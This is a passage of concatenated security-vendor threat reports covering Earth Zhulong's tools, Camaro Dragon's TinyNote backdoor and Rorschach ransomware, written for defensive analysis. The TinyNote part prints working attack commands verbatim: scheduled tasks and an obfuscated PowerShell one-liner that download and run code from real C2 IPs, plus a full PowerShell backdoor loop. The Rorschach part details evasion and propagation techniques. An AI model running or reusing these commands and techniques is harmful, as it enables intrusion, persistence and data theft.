It supports proxy (Socks5), upload/download file and remote shell functions.
Network configuration was defined in another configuration file, and it would be loaded when running the backdoor.
Furthermore, the configuration file will be deleted once it is loaded into memory for fear of leaking network infrastructures. 
cmd> {MACAMAX}.exe {network config file} Usage of MACAMAX -rh={remote host} -rp={remote port} -ps={proxy server} -sl=5
-to=0 -cg=1 Information defined in the configuration file. 
Themida-packed EarthWorm During our investigation, we found they also use the notorious network-penetration tool, “EarthWorm”.
EarthWorm is a simple network tunnel tool with SOCKS v5 server and port transfer developed by a Chinese engineer.
Although the original developer already stopped maintenance and removed the download link, it’s still getting more popular in the recent cyber-attack.
With this tool, the attackers are able to bypass the firewall and access the machine in a restricted network.
Since EarthWorm has become more common, security vendors also provide solutions to detect this powerful tool.
In order to avoid being detected by security products, threat actors use Themida packer to obfuscate the signature used for detection. 
Information Stealer We found a python-based information stealer used to collect internal information of victims.
This information stealer is compiled with Python 3.10 and packed by noted tools, “PyInstaller”, used to convert python script to be a standalone executable.
After checking the Python assembly code of the sample, we found this tool is used to dump information from the victim’s Oracle database.
Dumped data will be stored in a csv file and compressed by WinRAR with a password (“5tgb6yhn”), then all compressed data will be uploaded to Dropbox at the end. 
Figure 14.
Oracle connection config and SQL command for information dump Figure 15.
Embedded WinRAR command Figure 16.
Dropbox configuration and upload RAR data Footprint Hidden and Elimination Threat actors run PowerShell scripts with previous versions of PowerShell that do not support Script Block Logging with the intent to evade being detected while running the malicious scripts (so-called “Downgrade Attack”).
After finishing the operation, they will clean the intrusion footprint and delete important files, including payload and network configuration files, to avoid leaking any information to analysts.
It is worth noting that they also corrupt their shellcode loader by wiping out the header of the file, seen in Figure 15.
This is a common approach to make it harder for analysts to analyze their tools in the ransomware attack, but it’s relatively rare in an APT attack.
These show that they are sophisticated and meticulous actors. Figure 17.
Obfuscated PowerShell script used to clean the footprint on Domain Controller Figure 18.
Left is the corrupted ShellFang and the right one is the normal one. 
Attribution Summarizing the information collected from 2020 to 2022, we find that Earth Zhulong is likely to be related to a notorious hacking group, “1937CN” based on the code similarity and victimology aspects.
In this section, we will introduce the process of attribution. 
Code similarity Although the earliest variant of ShellFang used in this campaign was observed in 2020, we found the malware was already compiled in 2017, based on the timestamp of an export function, which can be seen in Figure 19.
In addition, we reviewed reports published around that time and found the decryption algorithm in ShellFang was once used in the campaign by 1937CN, which was revealed by Fortinet in 2017.
Shown in Figure 20, the XOR keyset and algorithm are highly similar.
Based on the prevalent time and algorithm, we believe Earth Zhulong is likely to be related to 1937CN. 
Figure 19.
Timestamp of export function in the earliest variant Figure 20.
The left is the algorithm revealed by Fortinet in 2017.
The right one is found in the earliest ShellFang variant. 
Victimology Based on our long-term investigation, Southeast Asia is Earth Zhulong’s major target, focusing on telecom and media sectors.
1937CN is a well-known hacking group in Southeast Asia and has always been their major target as well.
In 2016, 1937CN was suspected to attack Noi Bai and Tan Son Nhat airports in Vietnam, hijacking the flight information screens to broadcast anti-Vietnamese and anti-Philippines propaganda.
In 2017, Fortinet also revealed their campaign targeting Vietnamese organizations by using a weaponized RTF document.
In victimology aspects, Earth Zhulong is consistent with the 1937CN group. 
Conclusion Through long-term monitoring, we found this campaign continued targeting Southeast Asia from 2020 to 2022.
In the past 2 years, they always have used DLL sideloading as their major technique to launch their malware.
However, they continued updating their tools and even added more anti-analysis techniques in their latest tools including multi-layer obfuscation, API obfuscation, and execution flow obfuscation by raising exceptions intentionally. 
We also found they compromise the domain controller in the victim’s environment and deployed Cobalt Strike on their hosts by creating immediate tasks through GPO.
In addition, Go-lang and Python are also used as programming languages to build their tools.
Both programming languages provide strength for cross-platform programs development.
Furthermore, Python and Go-lang executables usually compile all necessary libraries in a single binary, making malware classification more difficult for analysts and resulting in a large binary.
Some security products have limitations when handling large files.
Which may be their approach as large binaries reduces the risk of being detected. 
In the process of tracking and analyzing the data, we have identified the hacker group behind the campaign which targets organizations in Southeast Asia, and called it Earth Zhulong.
Based on the victimology and usage of a highly similar decryption algorithm, we believe that Earth Zhulong is related to the hacking group known as “1937CN”.
We hope our findings will remind the public that the actions and motivations of 1937CN continue to resurface through groups like Earth Zhulong, and that these groups remain a big threat to cybersecurity in Southeast Asia. 
While the threat remains focused on Southeast Asia, tactics like this can be applied to various places across the world.
It is better to stay ahead of the curve to ensure your safety against these malicious actors.
Ensuring your systems are protected on all aspects is integral to the productivity of your enterprise.
Trend Micro Vision One can help you prevent threats like this with multiple security layers across all platforms, and its intuitive threat detection, investigation and response system makes it a key factor to stop Earth Zhulong’s evolving methods of infiltrating systems. 
Indicators of compromise (IOCs) Download the full list of IOCs here. 
MITRE Tactics Techniques Discovery T1087 - Account Discovery T1482 - Domain Trust Discovery Execution T1204.002 - User Execution: Malicious File Defense Evasion T1574.002 - Hijack Execution Flow: DLL Side-Loading T1055 - Process Injection T1070.006 - Timestomp T1140 - Deobfuscate/Decode Files or Information T1070 - Indicator Removal T1562.010 - Downgrade Attack Persistence T1053.005 - Scheduled
Task Privilege Escalation T1484 - Domain Policy Modification T1078 - Valid Account Command and Control T1071.001 - Application Layer Protocol: Web Protocols T1090.001 - Internal Proxy T1090.002 - External Proxy Authors Ted Lee Threat Researcher 
title: Malware Spotlight:
Camaro Dragon’s TinyNote Backdoor url: https://research.checkpoint.com/2023/malware-spotlight-camaro-dragons-tinynote-backdoor/ Executive summary Since early January 2023, there has been a notable surge in activity targeting European foreign affairs entities linked to Southeast and East Asia.
The threat actors responsible are tracked by Check Point Research as Camaro Dragon and are associated with a broad network of espionage operations aligned with Chinese interests.
Camaro Dragon overlaps with previously reported activities conducted by state-sponsored Chinese threat actors, namely Mustang Panda.
A portion of the group’s attack toolset and underlying infrastructure was thoroughly described by fellow ESET researchers in their detailed technical paper on the MQsTTang backdoor.
Check Point Research analysis of these attacks also has uncovered a malicious TP-Link router firmware containing a custom implant named Horse Shell, which allows the threat actors to maintain persistent access and build anonymous infrastructure using compromised routers. 
In this report, we analyze another previously undisclosed backdoor associated with this cluster of activity which shares with it not only a common infrastructure but also the same high-level intelligence-gathering goal. 
Key findings: A previously unknown Go-based backdoor called TinyNote was found on one of the Camaro Dragon distribution servers, in addition to being spotted in the wild.
The malware samples also communicate with other known C&C servers attributed to Camaro Dragon. 
The TinyNote backdoor is distributed with names related to foreign affairs matters, and likely targets Southeast and East Asian embassies. 
The backdoor performs a bypass of the Indonesian antivirus SmadAV, a security tool popular in Southeast Asian countries, such as Myanmar and Indonesia, and apparently used by a subset of the campaign targets. 
The TinyNote backdoor is a first-stage malware only capable of basic machine enumeration and command execution via PowerShell or Goroutines.
However, it focuses on redundancy to gain a foothold on the infected machine, including setting up multiple persistency tasks, communication with several different C&C servers, and different types of C&C command execution. 
Introduction When we investigated a few delivery servers related to Camaro Dragon, we discovered that one of them exposed the threat actors’ tools and files located on the server, only protected by basic HTTP Authorization with a known password.
Among many other tools, previously discussed by other researchers, we discovered yet another backdoor that we named TinyNote.
Interestingly, the folder with the backdoor contained two other tools: Autoruns by Sysinternals, and HRSWord, which is a part of the Chinese Huorong Network Technology protection suite, and is often used by various actors to disable endpoint protection tools. 
The backdoor we found on the server, and its versions found in the wild, are executables with names related to foreign affairs, such as PDF_ Contacts List Of Invitated Deplomatic Members and Note_Documents_No.14-Tokyo-__From___Embassy___of___Russia_.
This naming convention is similar to the one used at the same time by the MQsTTang backdoor versions discovered by ESET and found in VT.
Similar to MQsTTang, the TinyNote backdoor samples also contain folder icon in an attempt to deceive victims about their real purpose. 
The custom backdoor is written in the Go programming language.
In the copyright and build information for the executables, the malware developers left a reference to code.mil.mm, the Myanmar military infrastructure, likely to add credibility to their tool.
The actors’ heightened interest in Myanmar entities and successful attacks carried out against them were previously discussed thoroughly.
Our examination of the infrastructure led us to other findings that indicate the actors’ interest in Taiwan’s government entities as well. 
The TinyNote backdoor is a basic remote shell, limited in capabilities: it enables the actors to fingerprint the infected machine, set up persistence, and establish two different ways to execute commands received from the C&C server.
Despite its simplicity, it employs an interesting method of bypassing a very specific antivirus solution, suggesting the actors had issues gaining a foothold in specific environments. 
SmadAV evasion At the beginning of its execution, the malware starts a function called bypassSMADAV, whose purpose is to bypass the Indonesian antivirus Smadav.
The developers of the antivirus position their solution as a “second-layer antivirus” with “active users mostly from Indonesia, and other users mostly come from Southeast Asia and Africa Countries”.
The existence of the code that handles this specific antivirus once again confirms the focused targeting of Camaro Dragon campaigns and their knowledge of their victims’ environments and solutions.
It’s worth mentioning that in previous operations, the actors used SmadAV for their own purposes, forcing its component SmadAVprotect32.exe to side-load their malicious DLL. 
When any new process starts in the system, SmadAV scans all available windows.
For every problematic window found, the antivirus checks if the window is visible with the API function IsWindowVisible.
If the window is visible, it adds this window owner’s process ID to an array containing all current processes that have at least one visible window: Figure 1 – SmadAV code that collects a list of PIDs that have associated windows. 
After iterating over all windows, the antivirus process iterates over this array and compares each process ID to the newly created process ID.
If none is found, meaning the new process doesn’t have any visible windows, the antivirus deems the newly created process to be malicious and shows a popup that suggests blocking the created process.
This flow might act as protection from the techniques like process hollowing where the process is created in suspend mode and then replaced with malicious code. 
The threat actors appear to have reverse-engineered the logic of smadAV and dealt with this check by creating a window without a window name, but with the class name “EDIT” which is one of the available default windows class names.
The window attributes include a very large number for the X position, the width and height are set to 0, and flags such as WS_EX_TOOLWINDOW define the window as a tool window.
These attributes make sure the window is identified as visible by IsWindowVisible function, but in fact, it is not shown to the user and does not appear in the taskbar or when pressing ALT+TAB: 
Figure 2 – A piece of malware code creates a specially crafted window to bypass the smadAV. 
Before a call to CreateWindowEx, you would usually first need to create a class by calling RegisterClass and then class CreateWindowEx.
But in this case, the threat actors decided to use a default class name which allows them to skip calling the RegisterClass function prior to calling CreateWindow.
Ultimately, creating this window allows the threat actors to bypass the check, as the newly created window is technically visible, and continue the backdoor execution uninterrupted. 
Figure 3 – SmadAV detection on the Go backdoor with the removed bypassSMADAV function. 
Backdoor execution flow The malware creates a mutex named NASA&USA and then continues execution according to one of two modes of operation. 
First mode: persistence, PowerShell backdoor, and malware “installation” The malware checks if there is a “zip” string in the file path.
If this is not found, it continues the execution flow.
First, it creates the directory c:\programdata\Robots.
If this fails, the malware does not continue the execution, likely because the infected user only has low privileges. 
Next, the malware creates 2 scheduled tasks called test and test2 to retrieve and execute PowerShell commands, each retrieved from robots.txt from different C&C servers, most likely to eliminate a single point of failure: schtasks /Create
/TN test /SC MINUTE /MO 15 /TR "powershell \"$r=[System.
Net.WebRequest]::Create(\\\"http://5.188.33.190/Robots.txt\\\");(new-object System.IO.StreamReader(($r.GetResponse()).GetResponseStream())).ReadToEnd() | powershell.exe -noprofile -\"" /f schtasks /Create
/TN test2 /SC MINUTE /MO 45 /TR "powershell \"$r=[System.
Net.WebRequest]::Create(\\\"http://103.159.132.91/Robots.txt\\\");(new-object System.IO.StreamReader(($r.GetResponse()).GetResponseStream())).ReadToEnd() | powershell.exe -noprofile -\"" /f At the time of execution, both servers returned the same code pointing to the third server: C:\Windows\System32\cmd.exe /c "start powershell.exe -nop
-c set-alias exi iex;`$v1='iex (new-object net.webclient).dow';`$v2='nloadstring(''http://';`$v3='103.159.132.91/robots1.txt'')';exi(`$v1+`$v2+`$v3);" The final payload returned is a lightweight PowerShell backdoor, which retrieves a list of commands from the CMD header from the C&C server response, executes them with Invoke-Expression, concatenates the outputs with '_n1w_' string, and sends them back to the server in POST request: $WindowState = '[DllImport("user32.dll")]
public static extern bool ShowWindow(int handle, int stat);';add-type -name win -member $WindowState -namespace native;[native.win]::ShowWindow(([System.
Diagnostics.
Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0); $url="http://103.159.132.91:8081/"; $postParams = 'result=start'; while (1 -eq 1) { try { $data =
[System.
Text.
Encoding]::UTF8.GetBytes($postParams); $req =
[System.Net.WebRequest]::Create($url); $req.
ServicePoint.
ConnectionLimit =65535; If ($req.
CurrentConnections -ge 10000) { $req.
CloseConnectionGroup("") } $req.
Expect100Continue = $false; #$req.
Timeout = 10000; $req.
Method = "POST"; $req.
ContentType = "application/x-www-form-urlencoded"; $req.
ContentLength = $data.
Length; $Stream = $req.GetRequestStream(); $Stream.
Write($data, 0, $data.
Length);$Stream.
Flush();$Stream.
Close(); #waiting remote [System.Net.
WebResponse] $resp = $req.GetResponse();$header=$resp.
GetResponseHeader('CMD'); $d =
[System.Convert]::FromBase64String($header); $Ds =
Encoding]::UTF8.GetString($d);$result = ""; Foreach ($string in invoke-expression $Ds){$result=$result+'_n1w_'+$string;}; $result =
[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result)); $postParams = "result=$result"; } catch{}; }; 
The malware then copies itself to the zip file with the name [16 random characters].zip in c:\users\public\, and also creates another copy of itself to the path using the zip name as a folder, for example, c:\users\public\pMiOxI3G44Igrpq7.zip\. Both the file inside the zip and the unzipped copy of the file get the same randomly generated name [5 random characters].exe, for example, 8q3Fj.exe. 
Finally, the malware creates a scheduled task to execute its copy from this randomized path: schtasks /Create
/TN 8NaZrCq3pGeDRXKF /SC MINUTE /MO 15 /TR "explorer.exe c:\users\public\8NaZrCq3pGeDRXKF.zip\8NaZr.exe" /f Second mode: the backdoor This mode happens after the malware has achieved persistence and is running from a “zip” path.
First, the malware enumerates the system for the following data and concatenates it to one string: 
The current system username The current username home folder The system’s network interfaces (name, MacAddress, description) 
Next, it encrypts the string using a simple XOR encryption algorithm with the key NASA and Base64 encodes it afterward.
It then picks one random C&C URL out of the three available and constructs a GET request: http://5.188.33.190/api.php http://103.169.90.132/api.php http://103.159.132.91/api.php 
The encoded enumeration data is stored in a cookie called SSN.
Other headers in the request are constructed from serval random values.
The hostname header is selected from the following list: www.google.com www.facebook.com www.gstatic.com twitter.com The user-agent is also randomized and is selected from the following list: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0)
Gecko/20100101 Firefox/103.0 Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1 Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0)
Gecko/20100101 Firefox/63.0 Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0
Safari/537.36 The expected result from the server is a JSON with the following structure: {"msg":"[BASE64-ENCODED COMMAND]"} After the validation of the JSON and Base64 decoding, the malware creates a Goroutine that executes the command and continues to listen for more commands in a loop. 
Attribution 
In addition to the fact that one of the backdoor versions was found on the Camaro Dragon distribution server, there are other strong connections between the actors and the TinyNote malware: The server 103.159.132[.]91, where one of the versions of the malware was first found behaves like the C&C server of the backdoor, and was also a delivery server for the MQsTTang backdoor during the same time period. 
Another C&C server, 103.169.90[.]132, is known to be used by the threat actors continuously. 
The victimology and lures are consistent with the latest Camaro Dragon campaigns, including the activity associated with the MQsTTang backdoor.
In addition, the actors also keep using a “folder” icon and a specific naming convention for some of their backdoors seen since early 2023. 
The third C&C server, 5.188.33[.]190, has rather unique SSL certificates with Alternative names mail.mofa.gov.tw, intra.mofa.gov.tw, and *.mofa.gov.tw.
Another server with the same certificate, 23.106.123[.]59 is currently redirecting to the official infrastructure of the government of Taiwan, but likely was used for the additional attacks by the threat actor. 
Conclusion The TinyNote backdoor highlights the targeted approach of Camaro Dragon and the extensive research they conduct prior to infiltrating their intended victims’ systems.
Although the backdoor is not technically complex, it employs several noteworthy tactics to establish an initial foothold in the compromised systems.
These include the utilization of Golang, a programming language rarely used in Camaro Dragon tools, minimal lightweight functionality, and embedded bypass of a specific antivirus software commonly installed on potential targets.
The simultaneous use of this backdoor together with other tools with different levels of technical advancement implies that the threat actors are actively seeking to diversify their attack arsenal. 
IOCs f0b081ca58b6c253aa0014847c62dbad 6a2204b32a60aed0a3403c63ad2a529c 5.188.33[.]190 103.169.90[.]132 103.159.132[.]91 23.106.123[.]59 Check Point Customers remain protected: Threat Emulation provides comprehensive coverage of attack tactics, file types, and operating systems, powered by ThreatCloud AI – the brain behind all of Check Point’s Security. 
The post Malware Spotlight: Camaro Dragon’s TinyNote Backdoor appeared first on Check Point Research. 
title: Rorschach – A New Sophisticated and Fast Ransomware - Check Point Research url: https://research.checkpoint.com/2023/rorschach-a-new-sophisticated-and-fast-ransomware/ Research by: Jiri Vinopal, Dennis Yarizadeh and Gil Gekker Key Findings: Check Point Research (CPR) and Check Point Incident Response Team (CPIRT) encountered a previously unnamed ransomware strain, we dubbed Rorschach, deployed against a US-based company. 
Rorschach ransomware appears to be unique, sharing no overlaps that could easily attribute it to any known ransomware strain.
In addition, it does not bear any kind of branding which is a common practice among ransomware groups. 
The ransomware is partly autonomous, carrying out tasks that are usually manually performed during enterprise-wide ransomware deployment, such as creating a domain group policy (GPO).
In the past, similar functionality was linked to LockBit 2.0. 
The ransomware is highly customizable and contains technically unique features, such as the use of direct syscalls, rarely observed in ransomware.
Moreover, due to different implementation methods, Rorschach is one of the fastest ransomware observed, by the speed of encryption. 
The ransomware was deployed using DLL side-loading of a Cortex XDR Dump Service Tool, a signed commercial security product, a loading method which is not commonly used to load ransomware.
The vulnerability was properly reported to Palo Alto Networks. 
Introduction While responding to a ransomware case against a US-based company, the CPIRT recently came across a unique ransomware strain deployed using a signed component of a commercial security product.
Unlike other ransomware cases, the threat actor did not hide behind any alias and appears to have no affiliation to any of the known ransomware groups.
Those two facts, rarities in the ransomware ecosystem, piqued CPR interest and prompted us to thoroughly analyze the newly discovered malware. 
Throughout its analysis, the new ransomware exhibited unique features.
A behavioral analysis of the new ransomware suggests it is partly autonomous, spreading itself automatically when executed on a Domain Controller (DC), while it clears the event logs of the affected machines.
In addition, it’s extremely flexible, operating not only based on a built-in configuration but also on numerous optional arguments which allow it to change its behavior according to the operator’s needs.
While it seems to have taken inspiration from some of the most infamous ransomware families, it also contains unique functionalities, rarely seen among ransomware, such as the use of direct syscalls. 
The ransomware note sent out to the victim was formatted similarly to Yanluowang ransomware notes, although other variants dropped a note that more closely resembled DarkSide ransomware notes (causing some to mistakenly refer to it as DarkSide).
Each person who examined the ransomware saw something a little bit different, prompting us to name it after the famous psychological test – Rorschach Ransomware. 
Execution Flow As observed in the wild, Rorschach execution uses these three files: cy.exe – Cortex XDR Dump Service Tool version 7.3.0.16740, abused to side-load winutils.dll winutils.dll – Packed Rorschach loader and injector, used to decrypt and inject the ransomware. 
config.ini – Encrypted Rorschach ransomware which contains all the logic and configuration. 
Upon execution of cy.exe, due to DLL side-loading, the loader/injector winutils.dll is loaded into memory and runs in the context of cy.exe.
The main Rorschach payload config.ini is subsequently loaded into memory as well, decrypted and injected into notepad.exe, where the ransomware logic begins. 
Figure 1 – Rorschach’s High Level Execution Flow on both endpoints and on Domain Controllers. 
Security Solution Evasion Rorschach spawns processes in an uncommon way, running them in SUSPEND mode and giving out falsified arguments to harden analysis and remediation efforts.
The falsified argument, which consists of a repeating string of the digit 1 based on the length of the real argument, rewritten in memory and replaced with the real argument, resulting in a unique execution: Figure 2 – Rorschach’s process tree spawns processes with falsified arguments. 
The ransomware uses this technique to run the following operations: 
Attempt to stop a predefined list of services, using net.exe stop. 
Delete shadow volumes and backups to harden recovery, using legitimate Windows tools such as vssadmin.exe, bcdedit.exe, wmic.exe, and wbadmin.exe Run wevutil.exe to clear the following Windows event logs: Application, Security, System and Windows Powershell. 
Disable the Windows firewall, using netsh.exe Self-propagation When executed on a Windows Domain Controller (DC), the ransomware automatically creates a Group Policy, spreading itself to other machines within the domain.
Similar functionality was linked in the past to LockBit 2.0, although the Rorschach Ransomware GPO deployment is carried out differently, as described below: Rorschach copies its files into the scripts folder of the DC, and deletes them from the original location. 
Rorschach then creates a group policy (see Appendix C) that copies itself into the %Public% folder of all workstations in the domain. 
The ransomware creates another group policy in an attempt to kill a list of predefined list of processes.
This is done by creating a schedule task invoking taskkill.exe. 
Finally, Rorschach creates another group policy that registers a scheduled task which runs immediately and upon user logon, to run Rorschach’s main executable with the relevant arguments. 
Our colleagues in AhnLab published a more thorough behavioral analysis of another Rorschach variant which provides further details into the operations. 
Ransomware Analysis 
In addition to the ransomware’s uncommon behavior described above, the Rorschach binary itself contains additional interesting features, differentiating it further from other ransomware. 
Binary and Anti-Analysis Protection 
The actual sample is protected carefully, and requires quite a lot of work to access.
First, the initial loader/injector winutils.dll is protected with UPX-style packing.
However, this is changed in such a way that it isn’t readily unpacked using standard solutions and requires manual unpacking.
After unpacking, the sample loads and decrypts config.ini, which contains the ransomware logic. 
After Rorschach is injected into notepad.exe, it’s still protected by VMProtect.
This results in a crucial portion of the code being virtualized in addition to lacking an IAT table.
Only after defeating both of these safeguards is it possible to properly analyze the ransomware logic. 
Security Solution Evasion Although Rorschach is used solely for encrypting an environment, it incorporates an unusual technique to evade defense mechanisms.
It makes direct system calls using the “syscall” instruction.
While previously observed in other strains of malware, it’s quite startling to see this in ransomware. 
The procedure involves utilizing the instruction itself, and it goes as follows: 
The ransomware finds the relevant syscall numbers for NT APIs, mainly related to file manipulation. 
Rorschach then stores the numbers in a table for future use. 
When needed, it calls a stub routine that uses the number directly with the syscall instruction instead of using the NT API. 
In other words, the malware first creates a syscall table for NT APIs used for file encryption: Figure 3 – Creation of syscall table for certain NT APIs. 
The end of the table is a section with the relevant syscall numbers: Figure 4 – Section containing the syscall table. 
The example below shows how the syscall numbers are used: Figure 5 – Example use of direct syscall. 
This obfuscated process is not required for the ransomware encryption logic, which suggests it was developed to bypass security solutions monitoring direct API calls. 
Command Line Arguments 
In addition to the hardcoded configuration, the ransomware comes with multiple built-in options, probably for the operators comfort.
All of them are hidden, obfuscated, and not accessible without reverse-engineering the ransomware.
This table contains some of the arguments that we discovered: ArgumentExample ParameterDescription–run=1234Password needed to run the sample, possibly built on demand.–nomutex=1Do not create a mutex, therefore do not insure that only a single instance is running.–log=1Create log files.–nodel=0Do not self-delete on execution.–path=“C:”Encrypt only the following path.–noshare=1Do not encrypt shares.–pt=”C:.dll”Explicitly state the loader DLL.–cg=”C:.ini”Explicitly state the configuration file that stores the malware.–we=”C:.exe”Explicitly state the main executable.–diskpart=1Run diskpart.exe /s AppData_x.txt that removes read-
only volume attributes.–nobk=1Do not change the wallpaper of the infected machine.–thread=4Number of threads per CPU.–at=2023/03/24 05:04:20Activation time (trigger time).–nomail=1Do not create a ransom note.
This is only a partial list, with additional arguments suggesting networking capabilities, such as listen, srv and hostfile. 
Example of how some of these arguments are used: cy.exe --run=1234 --nomutex=0 --log=1 --nodel=1 --path="C:\Myfolder"
--full=1 --diskpart=1
--nobk=0 Language Based Protection Before encrypting the target system, the sample runs two system checks that can halt its execution: It uses GetSystemDefaultUILanguage and GetUserDefaultUILanguage to determine what language the user is using. 
It exits if the return value is commonly used in CIS countries: { 0x042b: "Armenian_Armenia", 0x042c: "Azeri_Latin", 0x043f: "Kazakh", 0x082c: "Azeri_Cyrillic", 0x419: "Russian", 0x422: "Ukrainian", 0x423: "Belarusian", 0x428: "Tajik", 0x437: "Georgian", 0x440: "Kyrgyz_Cyrillic", 0x442: "Turkmen", 0x443: "Uzbek_Latin", 0x819: "Russian_Moldava", 0x843: "Uzbek_Cyrillic" } Encryption Process The Rorschach ransomware employs a highly effective and fast hybrid-cryptography scheme, which blends the curve25519 and eSTREAM cipher hc-128 algorithms for encryption purposes.
This process only encrypts a specific portion of the original file content instead of the entire file.
The WinAPI CryptGenRandom is utilized to generate cryptographically random bytes used as a per-victim private key.
The shared secret is calculated through curve25519, using both the generated private key and a hardcoded public key.
Finally, the computed SHA512 hash of the shared secret is used to construct the KEY and IV for the eSTREAM cipher hc-128. 
Figure 6 – The Rorschach hybrid-cryptography scheme. 
Analysis of Rorschach’s encryption routine suggests not only the fast encryption scheme mentioned previously but also a highly effective implementation of thread scheduling via I/O completion ports.
In addition, it appears that compiler optimization is prioritized for speed, with much of the code being inlined.
All of these factors make us believe that we may be dealing with one of the fastest ransomware out there. 
To verify our hypothesis, we conducted five separate encryption speed tests in a controlled environment (with 6 CPUs, 8192MB RAM, SSD, and 220000 files to be encrypted), limited to local drive encryption only.
To provide a meaningful comparison with other known fast ransomware, we compared Rorschach with the notorious LockBit v.3. 
The result of the speed tests: RansomwareAverage approximate time of encryptionLockBit v.37 minutesRorschach4 minutes, 30 secondsIt turned out that we have a new speed demon in town.
What’s even more noteworthy is that the Rorschach ransomware is highly customizable.
By adjusting the number of encryption threads via the command line argument --thread, it can achieve even faster times. 
Technical Similarity to Other Ransomware 
When we compared Rorschach to other well-known ransomware families, we noticed that Rorschach uses a variety of time-honored methods together with some novel ideas in the ransomware industry.
The name itself, “Rorschach”, is quite self-explanatory; with deep reverse engineering of the code and its logic, we found certain similarities with some of the more technically advanced and established ransomware groups. 
We discussed Rorschach’s hybrid-cryptography scheme in detail above, but we suspect that this routine was borrowed from the leaked source code of Babuk ransomware.
See the following code snippets as examples: Figure 7 – Hybrid-cryptography scheme of Rorschach vs. Babuk. 
Rorschach’s inspiration from Babuk is evident in various routines, including those responsible for stopping processes and services.
In fact, the code used to stop services through the service control manager appears to have been directly copied from Babuk’s source code: Figure 8 – Stopping predefined list of services – Rorschach vs. Babuk. 
It is also worth noting that the list of services to be stopped in Rorschach’s configuration is identical to that in the leaked Babuk source code.
However, the list of processes to be stopped differs slightly, as Rorschach omits notepad.exe, which is used as a target for code injection. 
Rorahsach takes inspiration from another ransomware strain: LockBit.
First, the list of languages used to halt the malware is exactly the same list that was used in LockBit v2.0 (although the list is commonly used by many Russian speaking groups, and not just LockBit).
However, the I/O Completion Ports method of thread scheduling is another component where Rorschach took some inspiration from LockBit.
The final renaming of the encrypted machine files in Rorschach is implemented via NtSetInformationFile using FileInformationClass FileRenameInformation, just like in LockBit v2.0. 
Figure 9 – Renaming of encrypted file using NtSetInformationFile. 
As noted before, Rorschach’s code is protected and obfuscated in a way that is unusual for ransomware, and is compiled with compiler optimization to favor speed and code inlining as much as possible.
This makes finding similarities with other well-known ransomware families a real brain-buster.
But we can still say that Rorschach took the best from the ransomware families with the highest reputation, and then added some unique features of its own. 
Ransom Notes As we noted, Rorschach does not exhibit any clear-cut overlaps with any of the known ransomware groups but does appear to draw inspiration from some of them. 
We mentioned previously that Ahnlab reported a similar attack earlier this year.
While it was carried out through different means, the ransomware described in the report triggers an almost identical execution flow.
However, the resulting ransom note was completely different.
The note was actually very similar to those issued by DarkSide, which probably led to this new ransomware being named “DarkSide,” despite the group being inactive since May 2021. 
The Rorschach variant we analyzed leaves a different ransom note based on the structure used by Yanlowang, another ransomware group: Figure 10 – Ransom note from Rorschach. 
Conclusion Our analysis of Rorschach reveals the emergence of a new ransomware strain in the crimeware landscape.
Its developers implemented new anti-analysis and defense evasion techniques to avoid detection and make it more difficult for security software and researchers to analyze and mitigate its effects.
Additionally, Rorschach appears to have taken some of the ‘best’ features from some of the leading ransomwares leaked online, and integrated them all together.
In addition to Rorschach’s self-propagating capabilities, this raises the bar for ransom attacks.
The operators and developers of the Rorschach ransomware remain unknown.
They do not use branding, which is relatively rare in ransomware operations. 
Our findings underscore the importance of maintaining strong cybersecurity measures to prevent ransomware attacks, as well as the need for continuous monitoring and analysis of new ransomware samples to stay ahead of evolving threats.
As these attacks continue to grow in frequency and sophistication, it is essential for organizations to remain vigilant and proactive in their efforts to safeguard against these threats. 
Harmony Endpoint provides runtime protection against ransomware with instant automated remediation, even in offline mode. 
When running on a machine infected with the Rorschach ransomware, Harmony Endpoint Anti-ransomware detected the encryption process in different folders, including modifications made to Harmony Endpoint ‘honeypot’ files.
It ran a ranking algorithm that provided a verdict identifying the process as a ransomware. 
Samples/IOCs Files NameHashCommentscy.exe2237ec542cdcd3eb656e86e43b461cd1PA Cortex Dump Service Tool (benign file)winutils.dll4a03423c77fe2c8d979caca58a64ad6cLoader and injector into notepad.execonfig.ini6bd96d06cd7c4b084fe9346e55a81cf9Encrypted ransomware payloadAppendix A – Services and processes terminated through GPO by Rorschach The following services are stopped through a GPO issued by Rorschach, probably to prevent conflicting write orders to Database files (and thus preventing encryption): SQLPBDMSSQLPBENGINEMSSQLFDLauncherSQLSERVERAGENTMSSQLServerOLAPServiceSSASTELEMETRYSQLBrowserSQL Server Distributed Replay ClientSQL Server Distributed Replay ControllerMsDtsServer150SSISTELEMETRY150SSISScaleOutMaster150SSISScaleOutWorker150MSSQLLaunchpadSQLWriterSQLTELEMETRYMSSQLSERVERThe following processes are killed using a group policy (scheduled task) issued by Rorschach executing C:\windows\system32\taskkill.exe.
Some are likely terminated to prevent write conflicts, and some are security solutions: wxServer.exewxServerView.exesqlmangr.exeRAgui.exesupervise.exeCulture.exeDefwatch.exehttpd.exesync-taskbarsync-workerwsa_service.exesynctime.exevxmon.exesqlbrowser.exetomcat6.exeSqlservr.exeAppendix B – Hardcoded Rorschach configuration 
The following is a list of services, hardcoded in its configuration, to be stopped via the service control manager: AcronisAgentAcrSch2SvcbackupBackupExecAgentAcceleratorBackupExecAgentBrowserBackupExecDiveciMediaServiceBackupExecJobEngineBackupExecManagementServiceBackupExecRPCServiceBackupExecVSSProviderCAARCUpdateSvcCASAD2DWebSvcccEvtMgrccSetMgrDefWatchGxBlrGxCIMgrGxCVDGxFWDGxVssIntuit.
QuickBooks.
FCSmemtasmepocsPDVFSServiceQBCFMonitorServiceQBFCServiceQBIDPServiceRTVscanSavRoamsophossqlstc_raw_agentsvc$veeamVeeamDeploymentServiceVeeamNFSSvcVeeamTransportSvcVSNAPVSSvssYooBackupYooITzhudongfangyuThe following is a hardcoded list of directories and files to be omitted from encryption: ...
#recycle$Recycle.
Bin1_config.iniAhnlabAll UsersAppDataAUTOEXEC.BATautoexec.batautorun.infbegin.txtBootboot.inibootfont.binbootmgfw.efibootmgrbootmgr.efibootsect.bakconfig.inidesktop.inifinish.txtGoogleiconcache.dbInternet
